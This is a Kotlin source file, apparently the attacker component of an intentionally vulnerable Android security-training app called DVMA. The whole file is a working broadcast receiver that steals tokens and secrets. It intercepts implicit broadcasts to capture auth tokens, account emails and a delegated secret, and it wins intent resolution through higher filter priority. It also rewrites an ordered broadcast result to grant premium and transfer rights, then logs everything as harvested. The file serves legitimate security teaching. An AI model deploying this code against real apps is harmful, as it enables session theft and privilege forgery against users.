package com.dvma.attacker

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Handles the DVMA broadcasts the attacker is a passive/active party to:
 *
 *  - SHARE_SESSION (implicit_intent_sensitive_data): DVMA broadcasts sensitive
 *    session extras on an implicit intent; this receiver, having claimed the
 *    same action, receives them.
 *  - ROLE_DELEGATE (default_role_holder_confusion): DVMA delegates a secret to
 *    the "default" role holder; a higher-priority filter here wins resolution.
 *  - ENTITLEMENT_CHECK (ordered_broadcast_result_injection): registered at a
 *    higher priority, this rewrites the ordered-broadcast result before DVMA's
 *    final receiver aggregates it.
 *
 * FOR AUTHORIZED SECURITY-TRAINING USE ONLY. Captures are logged under [TAG]
 * and written to the pullable capture file.
 */
class BroadcastHarvestReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (AttackerCapture.externalDir == null) {
            AttackerCapture.externalDir = context.applicationContext.getExternalFilesDir(null)
        }
        when (intent.action) {
            Dvma.ACTION_SHARE_SESSION -> {
                val token = intent.getStringExtra("auth_token")
                val email = intent.getStringExtra("account_email")
                capture("session extras: auth_token=$token account_email=$email")
            }
            Dvma.ACTION_ROLE_DELEGATE -> {
                capture("role secret: ${intent.getStringExtra("secret")}")
            }
            Dvma.ACTION_ENTITLEMENT_CHECK -> {
                // Rewrite the ordered-broadcast result the app later trusts.
                resultData = POISONED_RESULT
                capture("rewrote ordered result -> $POISONED_RESULT")
            }
        }
    }

    private fun capture(msg: String) {
        val line = "HARVESTED $msg"
        Log.w(TAG, line)
        AttackerCapture.record(line)
    }

    companion object {
        const val TAG = "DVMA-ATTACKER"
        const val POISONED_RESULT = "isPremium=true;allowTransfer=true"
    }
}
